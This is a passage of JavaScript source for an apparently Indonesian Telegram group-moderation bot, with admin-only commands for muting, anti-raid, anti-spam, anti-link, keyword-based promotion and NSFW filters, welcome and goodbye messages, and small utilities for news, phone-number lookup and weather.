    if (!ctx.chat || ctx.chat.type === "private") return;

    const senderIsAdmin = await isAdmin(ctx, ctx.from.id);
    if (!senderIsAdmin) {
      return ctx.reply("❌ Hanya admin yang bisa mute user.");
    }

    let targetId = null;
    const args = ctx.message.text.split(" ").slice(1);
    let durationArg = args[0];

    // target dari reply
    if (ctx.message.reply_to_message) {
      targetId = ctx.message.reply_to_message.from.id;
    }

    // kalau bukan reply, pakai id sebagai argumen pertama lalu durasi arg kedua
    else if (args[0] && /^\d+$/.test(args[0])) {
      targetId = Number(args[0]);
      durationArg = args[1];
    }

    if (!targetId) {
      return ctx.reply("❌ Format:\nReply user lalu /mute 10m\natau\n/mute userid 10m");
    }

    if (!durationArg) {
      return ctx.reply("❌ Masukkan durasi.\nContoh: /mute 10m");
    }

    const durationSeconds = parseDuration(durationArg);
    if (!durationSeconds) {
      return ctx.reply("❌ Format durasi salah.\nGunakan: 10m / 2h / 1d");
    }

    const targetMember = await ctx.getChatMember(targetId).catch(() => null);
    if (!targetMember) {
      return ctx.reply("❌ User tidak ditemukan di grup.");
    }

    if (["creator", "administrator"].includes(targetMember.status)) {
      return ctx.reply("❌ Tidak bisa mute admin.");
    }

    const untilDate = Math.floor(Date.now() / 1000) + durationSeconds;

    await ctx.telegram.restrictChatMember(ctx.chat.id, targetId, {
      permissions: {
        can_send_messages: false,
        can_send_audios: false,
        can_send_documents: false,
        can_send_photos: false,
        can_send_videos: false,
        can_send_video_notes: false,
        can_send_voice_notes: false,
        can_send_polls: false,
        can_send_other_messages: false,
        can_add_web_page_previews: false,
        can_change_info: false,
        can_invite_users: false,
        can_pin_messages: false,
        can_manage_topics: false
      },
      until_date: untilDate
    });

    return ctx.reply(`🔇 User berhasil di-mute selama ${durationArg}.`);
  } catch (err) {
    console.log("MUTE ERROR:", err.message);
    return ctx.reply("❌ Gagal mute user.");
  }
});

// /unmute
// reply user lalu /unmute
bot.command("unmute", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const senderIsAdmin = await isAdmin(ctx, ctx.from.id);
    if (!senderIsAdmin) {
      return ctx.reply("❌ Hanya admin yang bisa unmute user.");
    }

    let targetId = null;
    const args = ctx.message.text.split(" ").slice(1);

    if (ctx.message.reply_to_message) {
      targetId = ctx.message.reply_to_message.from.id;
    } else if (args[0] && /^\d+$/.test(args[0])) {
      targetId = Number(args[0]);
    }

    if (!targetId) {
      return ctx.reply("❌ Format:\nReply user lalu /unmute\natau\n/unmute userid");
    }

    await ctx.telegram.restrictChatMember(ctx.chat.id, targetId, {
      permissions: {
        can_send_messages: true,
        can_send_audios: true,
        can_send_documents: true,
        can_send_photos: true,
        can_send_videos: true,
        can_send_video_notes: true,
        can_send_voice_notes: true,
        can_send_polls: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
        can_change_info: false,
        can_invite_users: true,
        can_pin_messages: false,
        can_manage_topics: false
      }
    });

    return ctx.reply("🔊 User berhasil di-unmute.");
  } catch (err) {
    console.log("UNMUTE ERROR:", err.message);
    return ctx.reply("❌ Gagal unmute user.");
  }
});

// storage simple (memory)
const antiRaidGroups = new Set();
const raidTracker = new Map();
// chatId => { joins: [timestamp], raidMode: boolean, until: timestamp }

// setting
const RAID_JOIN_LIMIT = 5; // kalau 5 member join
const RAID_INTERVAL = 10 * 1000; // dalam 10 detik
const RAID_MODE_DURATION = 60 * 1000; // raid mode aktif 60 detik

// ON
bot.command("antiraid", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (!["creator", "administrator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa mengaktifkan Anti Raid.");
    }

    antiRaidGroups.add(ctx.chat.id);
    return ctx.reply("✅ Anti Raid diaktifkan di grup ini.");
  } catch (err) {
    console.log("ANTIRAID ON ERROR:", err.message);
    return ctx.reply("❌ Gagal mengaktifkan Anti Raid.");
  }
});

// OFF
bot.command("antiraidoff", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (!["creator", "administrator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa mematikan Anti Raid.");
    }

    antiRaidGroups.delete(ctx.chat.id);
    raidTracker.delete(ctx.chat.id);

    return ctx.reply("❌ Anti Raid dimatikan.");
  } catch (err) {
    console.log("ANTIRAID OFF ERROR:", err.message);
    return ctx.reply("❌ Gagal mematikan Anti Raid.");
  }
});

// OPTIONAL STATUS
bot.command("antiraidstatus", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const data = raidTracker.get(ctx.chat.id);
    if (!antiRaidGroups.has(ctx.chat.id)) {
      return ctx.reply("📌 Anti Raid: OFF");
    }

    if (!data || !data.raidMode) {
      return ctx.reply("📌 Anti Raid: ON\n🚦 Status: Normal");
    }

    const sisa = Math.max(0, Math.ceil((data.until - Date.now()) / 1000));
    return ctx.reply(`📌 Anti Raid: ON\n🚨 Status: Raid Mode\n⏳ Sisa: ${sisa} detik`);
  } catch (err) {
    console.log("ANTIRAID STATUS ERROR:", err.message);
  }
});

// storage simple (memory)
const slowModeGroups = new Map();
// format:
// chatId => delay dalam detik

const slowModeUsers = new Map();
// format:
// `${chatId}:${userId}` => lastMessageTimestamp

// ON
bot.command("slowmode", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (!["creator", "administrator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa mengaktifkan Slow Mode.");
    }

    const args = ctx.message.text.split(" ");
    const delay = parseInt(args[1]);

    if (!delay || delay < 1) {
      return ctx.reply("❌ Format:\n/slowmode 5");
    }

    slowModeGroups.set(ctx.chat.id, delay);
    return ctx.reply(`✅ Slow Mode diaktifkan (${delay} detik).`);
  } catch (err) {
    console.log("SLOWMODE ON ERROR:", err.message);
    return ctx.reply("❌ Gagal mengaktifkan Slow Mode.");
  }
});

// OFF
bot.command("slowmodeoff", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (!["creator", "administrator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa mematikan Slow Mode.");
    }

    slowModeGroups.delete(ctx.chat.id);

    // hapus cache user grup ini biar bersih
    for (const key of slowModeUsers.keys()) {
      if (key.startsWith(`${ctx.chat.id}:`)) {
        slowModeUsers.delete(key);
      }
    }

    return ctx.reply("❌ Slow Mode dimatikan.");
  } catch (err) {
    console.log("SLOWMODE OFF ERROR:", err.message);
    return ctx.reply("❌ Gagal mematikan Slow Mode.");
  }
});

// storage simple (memory)
const antiFake = new Set();

// helper deteksi akun mencurigakan
function isSuspiciousAccount(user) {
  const firstName = (user.first_name || "").trim();
  const lastName = (user.last_name || "").trim();
  const fullName = `${firstName} ${lastName}`.trim();
  const username = user.username || "";

  let score = 0;
  const reasons = [];

  // nama terlalu pendek
  if (fullName.length > 0 && fullName.length <= 3) {
    score += 1;
    reasons.push("nama terlalu pendek");
  }

  // terlalu banyak angka di nama
  const digitsInName = (fullName.match(/\d/g) || []).length;
  if (digitsInName >= 4) {
    score += 2;
    reasons.push("nama banyak angka");
  }

  // nama aneh/random
  if (/[A-Za-z0-9]{10,}/.test(fullName.replace(/\s/g, ""))) {
    score += 1;
    reasons.push("nama random");
  }

  // username tidak ada
  if (!username) {
    score += 1;
    reasons.push("tanpa username");
  }

  // username terlalu random
  if (username && /[a-zA-Z]*\d{5,}/.test(username)) {
    score += 1;
    reasons.push("username mencurigakan");
  }

  // nama mengandung kata spam/promosi
  const suspiciousWords = [
    "admin",
    "store",
    "shop",
    "panel",
    "murah",
    "promo",
    "seller",
    "jasa",
    "open",
    "bot"
  ];

  const lowerName = fullName.toLowerCase();
  const lowerUsername = username.toLowerCase();

  if (suspiciousWords.some(w => lowerName.includes(w) || lowerUsername.includes(w))) {
    score += 2;
    reasons.push("nama/username promosi");
  }

  return {
    suspicious: score >= 2,
    score,
    reasons
  };
}

// ON
bot.command("antifake", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (!["creator", "administrator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa mengaktifkan Anti Fake.");
    }

    antiFake.add(ctx.chat.id);
    return ctx.reply("✅ Anti Fake diaktifkan di grup ini.");
  } catch (err) {
    console.log("ANTIFAKE ON ERROR:", err.message);
    return ctx.reply("❌ Gagal mengaktifkan Anti Fake.");
  }
});

// OFF
bot.command("antifakeoff", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (!["creator", "administrator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa mematikan Anti Fake.");
    }

    antiFake.delete(ctx.chat.id);
    return ctx.reply("❌ Anti Fake dimatikan di grup ini.");
  } catch (err) {
    console.log("ANTIFAKE OFF ERROR:", err.message);
    return ctx.reply("❌ Gagal mematikan Anti Fake.");
  }
});

// storage simple (memory)
const aiFilterGroups = new Set();

// ON
bot.command("aifilter", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (!["creator", "administrator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa mengaktifkan AI Filter.");
    }

    aiFilterGroups.add(ctx.chat.id);
    return ctx.reply("✅ AI Filter diaktifkan di grup ini.");
  } catch (err) {
    console.log("AI FILTER ON ERROR:", err.message);
    return ctx.reply("❌ Gagal mengaktifkan AI Filter.");
  }
});

// OFF
bot.command("aifilteroff", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (!["creator", "administrator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa mematikan AI Filter.");
    }

    aiFilterGroups.delete(ctx.chat.id);
    return ctx.reply("❌ AI Filter dimatikan di grup ini.");
  } catch (err) {
    console.log("AI FILTER OFF ERROR:", err.message);
    return ctx.reply("❌ Gagal mematikan AI Filter.");
  }
});

// helper smart detect
function analyzeMessage(text = "") {
  const msg = text.toLowerCase().trim();

  const badWords = [
    "anjing", "bangsat", "bajingan", "tolol", "goblok",
    "kontol", "memek", "ngentot", "jancok", "asu"
  ];

  const promoWords = [
    "open jasa", "open bot", "open panel", "jual", "promo",
    "diskon", "murah", "trusted seller", "join channel",
    "join grup", "dm me", "pm me", "hubungi saya", "order", "ready"
  ];

  const suspiciousWords = [
    "klik sini", "claim now", "free saldo", "gratis", "cuan",
    "untung besar", "join sekarang", "cek bio", "slot gacor",
    "maxwin", "deposit", "wd cepat"
  ];

  const reasons = [];
  let score = 0;

  // link
  const hasLink = /(https?:\/\/\S+|t\.me\/\S+|wa\.me\/\S+|chat\.whatsapp\.com\/\S+|www\.\S+)/i.test(msg);
  if (hasLink) {
    score += 2;
    reasons.push("link mencurigakan");
  }

  // badword
  if (badWords.some((w) => msg.includes(w))) {
    score += 2;
    reasons.push("badword");
  }

  // promosi
  if (promoWords.some((w) => msg.includes(w))) {
    score += 2;
    reasons.push("promosi");
  }

  // scam / suspicious
  if (suspiciousWords.some((w) => msg.includes(w))) {
    score += 2;
    reasons.push("kata mencurigakan");
  }

  // huruf berulang berlebihan
  if (/(.)\1{6,}/i.test(msg)) {
    score += 1;
    reasons.push("huruf berulang");
  }

  // terlalu banyak emoji / simbol
  const emojiOrSymbolCount = (msg.match(/[^\w\s]/g) || []).length;
  if (emojiOrSymbolCount >= 12) {
    score += 1;
    reasons.push("simbol berlebihan");
  }

  // CAPS berlebihan
  const original = text.trim();
  const upperChars = (original.match(/[A-Z]/g) || []).length;
  const alphaChars = (original.match(/[A-Za-z]/g) || []).length;
  if (alphaChars >= 8 && upperChars / alphaChars > 0.7) {
    score += 1;
    reasons.push("caps berlebihan");
  }

  // pesan terlalu pendek tapi aneh
  if (msg.length <= 8 && hasLink) {
    score += 1;
    reasons.push("short spam");
  }

  return {
    flagged: score >= 3,
    score,
    reasons
  };
}

// storage simple (memory)
const goodbyeSettings = new Map();
// format:
// chatId => { enabled: true, text: "Selamat tinggal {name} dari {group}" }

// SET GOODBYE
bot.command("setgoodbye", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (!["creator", "administrator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa mengatur goodbye.");
    }

    const text = ctx.message.text.split(" ").slice(1).join(" ").trim();
    if (!text) {
      return ctx.reply(
        "❌ Format:\n/setgoodbye Selamat tinggal {name} dari {group}"
      );
    }

    goodbyeSettings.set(ctx.chat.id, {
      enabled: true,
      text
    });

    return ctx.reply("✅ Goodbye message berhasil diset dan diaktifkan.");
  } catch (err) {
    console.log("SETGOODBYE ERROR:", err.message);
    return ctx.reply("❌ Gagal mengatur goodbye.");
  }
});

// GOODBYE OFF
bot.command("goodbyeoff", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (!["creator", "administrator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa mematikan goodbye.");
    }

    const data = goodbyeSettings.get(ctx.chat.id);
    if (!data) {
      return ctx.reply("❌ Goodbye belum pernah diset di grup ini.");
    }

    data.enabled = false;
    goodbyeSettings.set(ctx.chat.id, data);

    return ctx.reply("❌ Goodbye message dimatikan.");
  } catch (err) {
    console.log("GOODBYEOFF ERROR:", err.message);
    return ctx.reply("❌ Gagal mematikan goodbye.");
  }
});

// GOODBYE ON
bot.command("goodbyeon", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (!["creator", "administrator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa mengaktifkan goodbye.");
    }

    const data = goodbyeSettings.get(ctx.chat.id);
    if (!data || !data.text) {
      return ctx.reply("❌ Goodbye belum diset.\nGunakan /setgoodbye dulu.");
    }

    data.enabled = true;
    goodbyeSettings.set(ctx.chat.id, data);

    return ctx.reply("✅ Goodbye message diaktifkan.");
  } catch (err) {
    console.log("GOODBYEON ERROR:", err.message);
    return ctx.reply("❌ Gagal mengaktifkan goodbye.");
  }
});

// LIHAT GOODBYE
bot.command("getgoodbye", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const data = goodbyeSettings.get(ctx.chat.id);
    if (!data) {
      return ctx.reply("❌ Goodbye belum diset di grup ini.");
    }

    return ctx.reply(
      `📌 Status: ${data.enabled ? "ON" : "OFF"}\n📝 Pesan:\n${data.text}`
    );
  } catch (err) {
    console.log("GETGOODBYE ERROR:", err.message);
    return ctx.reply("❌ Gagal mengambil goodbye.");
  }
});

// storage simple (memory)
const welcomeSettings = new Map();
// format:
// chatId => { enabled: true, text: "Halo {name}, selamat datang di {group}" }

// SET WELCOME
bot.command("setwelcome", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (!["creator", "administrator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa mengatur welcome.");
    }

    const text = ctx.message.text.split(" ").slice(1).join(" ").trim();
    if (!text) {
      return ctx.reply(
        "❌ Format:\n/setwelcome Halo {name}, selamat datang di {group}"
      );
    }

    welcomeSettings.set(ctx.chat.id, {
      enabled: true,
      text
    });

    return ctx.reply("✅ Welcome message berhasil diset dan diaktifkan.");
  } catch (err) {
    console.log("SETWELCOME ERROR:", err.message);
    return ctx.reply("❌ Gagal mengatur welcome.");
  }
});

// WELCOME OFF
bot.command("welcomeoff", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (!["creator", "administrator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa mematikan welcome.");
    }

    const data = welcomeSettings.get(ctx.chat.id);
    if (!data) {
      return ctx.reply("❌ Welcome belum pernah diset di grup ini.");
    }

    data.enabled = false;
    welcomeSettings.set(ctx.chat.id, data);

    return ctx.reply("❌ Welcome message dimatikan.");
  } catch (err) {
    console.log("WELCOMEOFF ERROR:", err.message);
    return ctx.reply("❌ Gagal mematikan welcome.");
  }
});

// WELCOME ON
bot.command("welcomeon", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (!["creator", "administrator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa mengaktifkan welcome.");
    }

    const data = welcomeSettings.get(ctx.chat.id);
    if (!data || !data.text) {
      return ctx.reply("❌ Welcome belum diset.\nGunakan /setwelcome dulu.");
    }

    data.enabled = true;
    welcomeSettings.set(ctx.chat.id, data);

    return ctx.reply("✅ Welcome message diaktifkan.");
  } catch (err) {
    console.log("WELCOMEON ERROR:", err.message);
    return ctx.reply("❌ Gagal mengaktifkan welcome.");
  }
});

// LIHAT WELCOME
bot.command("getwelcome", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const data = welcomeSettings.get(ctx.chat.id);
    if (!data) {
      return ctx.reply("❌ Welcome belum diset di grup ini.");
    }

    return ctx.reply(
      `📌 Status: ${data.enabled ? "ON" : "OFF"}\n📝 Pesan:\n${data.text}`
    );
  } catch (err) {
    console.log("GETWELCOME ERROR:", err.message);
    return ctx.reply("❌ Gagal mengambil welcome.");
  }
});

// storage simple
const autoDelete = new Map(); 
// value: delay dalam detik

// ON + set delay (default 10 detik)
bot.command("autodel", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (!["creator", "administrator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa mengaktifkan.");
    }

    const text = ctx.message.text.split(" ");
    const delay = parseInt(text[1]) || 10;

    autoDelete.set(ctx.chat.id, delay);

    return ctx.reply(`✅ Auto Delete aktif (${delay} detik).`);
  } catch (err) {
    console.log("AUTODEL ON ERROR:", err.message);
    return ctx.reply("❌ Gagal mengaktifkan Auto Delete.");
  }
});

// OFF
bot.command("autodeloff", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (!["creator", "administrator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa mematikan.");
    }

    autoDelete.delete(ctx.chat.id);

    return ctx.reply("❌ Auto Delete dimatikan.");
  } catch (err) {
    console.log("AUTODEL OFF ERROR:", err.message);
    return ctx.reply("❌ Gagal mematikan Auto Delete.");
  }
});

// storage simple (memory)
const autoActionGroups = new Map(); 
// value: "kick" atau "ban"

// ON KICK
bot.command("autokick", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (!["creator", "administrator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa mengaktifkan Auto Kick.");
    }

    autoActionGroups.set(ctx.chat.id, "kick");
    return ctx.reply("✅ Auto Kick diaktifkan di grup ini.");
  } catch (err) {
    console.log("AUTOKICK ON ERROR:", err.message);
    return ctx.reply("❌ Gagal mengaktifkan Auto Kick.");
  }
});

// ON BAN
bot.command("autoban", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (!["creator", "administrator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa mengaktifkan Auto Ban.");
    }

    autoActionGroups.set(ctx.chat.id, "ban");
    return ctx.reply("✅ Auto Ban diaktifkan di grup ini.");
  } catch (err) {
    console.log("AUTOBAN ON ERROR:", err.message);
    return ctx.reply("❌ Gagal mengaktifkan Auto Ban.");
  }
});

// OFF
bot.command("autoactionoff", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (!["creator", "administrator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa mematikan Auto Kick/Ban.");
    }

    autoActionGroups.delete(ctx.chat.id);
    return ctx.reply("❌ Auto Kick/Ban dimatikan di grup ini.");
  } catch (err) {
    console.log("AUTOACTION OFF ERROR:", err.message);
    return ctx.reply("❌ Gagal mematikan Auto Kick/Ban.");
  }
});

// storage simple (memory)
const antiPromosi = new Set();

// daftar kata promosi, bebas kamu tambah/kurang
const promosiWords = [
  "open jasa",
  "open bot",
  "open panel",
  "panel murah",
  "murah meriah",
  "jual",
  "jualan",
  "buy",
  "sell",
  "promosi",
  "promo",
  "diskon",
  "order",
  "ready",
  "stok tersedia",
  "hubungi saya",
  "chat pribadi",
  "pm me",
  "dm me",
  "join channel",
  "join grup",
  "trusted seller",
  "nokos",
  "sewa bot",
  "admin panel",
  "script bot",
  "murbug",
  "pt panel"
];

// ON
bot.command("antipromosi", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (!["creator", "administrator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa mengaktifkan Anti Promosi.");
    }

    antiPromosi.add(ctx.chat.id);
    return ctx.reply("✅ Anti Promosi diaktifkan di grup ini.");
  } catch (err) {
    console.log("ANTI PROMOSI ON ERROR:", err.message);
    return ctx.reply("❌ Gagal mengaktifkan Anti Promosi.");
  }
});

// OFF
bot.command("antipromosioff", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (!["creator", "administrator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa mematikan Anti Promosi.");
    }

    antiPromosi.delete(ctx.chat.id);
    return ctx.reply("❌ Anti Promosi dimatikan di grup ini.");
  } catch (err) {
    console.log("ANTI PROMOSI OFF ERROR:", err.message);
    return ctx.reply("❌ Gagal mematikan Anti Promosi.");
  }
});

// storage simple (memory)
const antiSpam = new Set();
const spamTracker = new Map();

// setting anti spam
const SPAM_LIMIT = 5; // maksimal pesan
const SPAM_INTERVAL = 10 * 1000; // dalam 10 detik

// ON
bot.command("antispam", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (!["creator", "administrator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa mengaktifkan Anti Spam.");
    }

    antiSpam.add(ctx.chat.id);
    return ctx.reply("✅ Anti Spam diaktifkan di grup ini.");
  } catch (err) {
    console.log("ANTISPAM ON ERROR:", err.message);
    return ctx.reply("❌ Gagal mengaktifkan Anti Spam.");
  }
});

// OFF
bot.command("antispamoff", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (!["creator", "administrator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa mematikan Anti Spam.");
    }

    antiSpam.delete(ctx.chat.id);
    return ctx.reply("❌ Anti Spam dimatikan di grup ini.");
  } catch (err) {
    console.log("ANTISPAM OFF ERROR:", err.message);
    return ctx.reply("❌ Gagal mematikan Anti Spam.");
  }
});

// storage simple (memory)
const antiNsfw = new Set();

// daftar kata NSFW, bebas kamu tambah
const nsfwWords = [
  "bokep",
  "ngentot",
  "memek",
  "kontol",
  "sange",
  "coli",
  "porn",
  "porno",
  "sex",
  "seks",
  "bugil",
  "telanjang",
  "jav",
  "hentai"
];

// ON
bot.command("antinsfw", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (!["creator", "administrator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa mengaktifkan Anti NSFW.");
    }

    antiNsfw.add(ctx.chat.id);
    return ctx.reply("✅ Anti NSFW diaktifkan di grup ini.");
  } catch (err) {
    console.log("ANTI NSFW ON ERROR:", err.message);
    return ctx.reply("❌ Gagal mengaktifkan Anti NSFW.");
  }
});

// OFF
bot.command("antinsfwoff", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (!["creator", "administrator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa mematikan Anti NSFW.");
    }

    antiNsfw.delete(ctx.chat.id);
    return ctx.reply("❌ Anti NSFW dimatikan di grup ini.");
  } catch (err) {
    console.log("ANTI NSFW OFF ERROR:", err.message);
    return ctx.reply("❌ Gagal mematikan Anti NSFW.");
  }
});

// storage simple (memory)
const antiBot = new Set();

// ON
bot.command("antibot", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (!["creator", "administrator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa mengaktifkan Anti Bot.");
    }

    antiBot.add(ctx.chat.id);
    return ctx.reply("✅ Anti Bot diaktifkan di grup ini.");
  } catch (err) {
    console.log("ANTIBOT ON ERROR:", err.message);
    return ctx.reply("❌ Gagal mengaktifkan Anti Bot.");
  }
});

// OFF
bot.command("antibotoff", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return;

    const member = await ctx.getChatMember(ctx.from.id);
    if (!["creator", "administrator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa mematikan Anti Bot.");
    }

    antiBot.delete(ctx.chat.id);
    return ctx.reply("❌ Anti Bot dimatikan di grup ini.");
  } catch (err) {
    console.log("ANTIBOT OFF ERROR:", err.message);
    return ctx.reply("❌ Gagal mematikan Anti Bot.");
  }
});

// storage simple (memory)
const antiLink = new Set();

// COMMAND ON
bot.command("antilink", async (ctx) => {
  if (!ctx.chat || ctx.chat.type === "private") return;

  const member = await ctx.getChatMember(ctx.from.id);
  if (!["creator", "administrator"].includes(member.status)) {
    return ctx.reply("❌ Hanya admin yang bisa mengaktifkan.");
  }

  antiLink.add(ctx.chat.id);
  ctx.reply("✅ Anti Link diaktifkan di grup ini.");
});

// COMMAND OFF
bot.command("antilinkoff", async (ctx) => {
  if (!ctx.chat || ctx.chat.type === "private") return;

  const member = await ctx.getChatMember(ctx.from.id);
  if (!["creator", "administrator"].includes(member.status)) {
    return ctx.reply("❌ Hanya admin yang bisa mematikan.");
  }

  antiLink.delete(ctx.chat.id);
  ctx.reply("❌ Anti Link dimatikan.");
});

//------------------(AWAL OF TOOLS)--------------------//
bot.command("berita", async (ctx) => {
  try {
    const axios = require("axios");
    const cheerio = require("cheerio");

    const msg = await ctx.reply("⏳ Mengambil berita terbaru...");

    // Google News Indonesia
    const url = "https://news.google.com/rss?hl=id&gl=ID&ceid=ID:id";

    const res = await axios.get(url);
    const $ = cheerio.load(res.data, { xmlMode: true });

    let hasil = "📰 Berita Hari Ini:\n\n";

    $("item").slice(0, 5).each((i, el) => {
      const title = $(el).find("title").text();
      const link = $(el).find("link").text();

      hasil += `${i + 1}. ${title}\n${link}\n\n`;
    });

    await ctx.reply(hasil);

    try {
      await ctx.deleteMessage(msg.message_id);
    } catch {}

  } catch (err) {
    console.log("BERITA ERROR:", err.message);
    ctx.reply("❌ Gagal mengambil berita.");
  }
});

bot.command("cekwa", async (ctx) => {
  try {
    const text = ctx.message.text.split(" ");
    let number = text[1];

    if (!number) {
      return ctx.reply("❌ Format:\n/cekwa 628xxxx");
    }

    number = number.replace(/[^0-9]/g, "");
    const jid = number + "@s.whatsapp.net";

    const msg = await ctx.reply("⏳ Mengecek nomor...");

    let result;

    try {
      const check = await sock.onWhatsApp(jid);
      result = check?.[0]?.exists;
    } catch {
      return ctx.reply("❌ Gagal cek nomor.");
    }

    if (result) {
      await ctx.reply(`✅ Nomor ${number} terdaftar di WhatsApp`);
    } else {
      await ctx.reply(`❌ Nomor ${number} tidak terdaftar / kemungkinan tidak aktif`);
    }

    try {
      await ctx.deleteMessage(msg.message_id);
    } catch {}

  } catch (err) {
    console.log("CEK WA ERROR:", err.message);
    ctx.reply("❌ Terjadi error.");
  }
});

bot.command("ceknomor", async (ctx) => {
  try {
    const text = ctx.message.text.split(" ");
    let number = text[1];

    if (!number) {
      return ctx.reply("❌ Format:\n/ceknomor 628xxxx");
    }

    number = number.replace(/[^0-9]/g, "");

    const msg = await ctx.reply("⏳ Mengecek nomor...");

    const axios = require("axios");

    // pakai API numlookup
    const { data } = await axios.get(
      `https://api.numlookupapi.com/v1/validate/${number}?apikey=free`
    );

    if (!data || data.valid === false) {
      return ctx.reply("❌ Nomor tidak valid.");
    }

    const result = `
📱 Nomor: ${number}
🌍 Negara: ${data.country_name}
📡 Operator: ${data.carrier}
📶 Tipe: ${data.line_type}
`;

    await ctx.reply(result);

    try {
      await ctx.deleteMessage(msg.message_id);
    } catch {}

  } catch (err) {
    console.log("CEK NOMOR ERROR:", err.message);
    ctx.reply("❌ Gagal mengecek nomor.");
  }
});

bot.command("cuaca", async (ctx) => {
  try {
    const text = ctx.message.text.split(" ");
    const kota = text.slice(1).join(" ");

    if (!kota) {
      return ctx.reply("❌ Format:\n/cuaca <kota>\nContoh: /cuaca Jakarta");
    }

    const msg = await ctx.reply("⏳ Mengecek cuaca...");

    const axios = require("axios");

    const res = await axios.get(`https://wttr.in/${encodeURIComponent(kota)}?format=j1`);

    const data = res.data;

    const current = data.current_condition[0];

    const temp = current.temp_C;
    const feels = current.FeelsLikeC;
    const humidity = current.humidity;
    const wind = current.windspeedKmph;
    const desc = current.weatherDesc[0].value;

    const result = `
🌤️ Cuaca di ${kota}

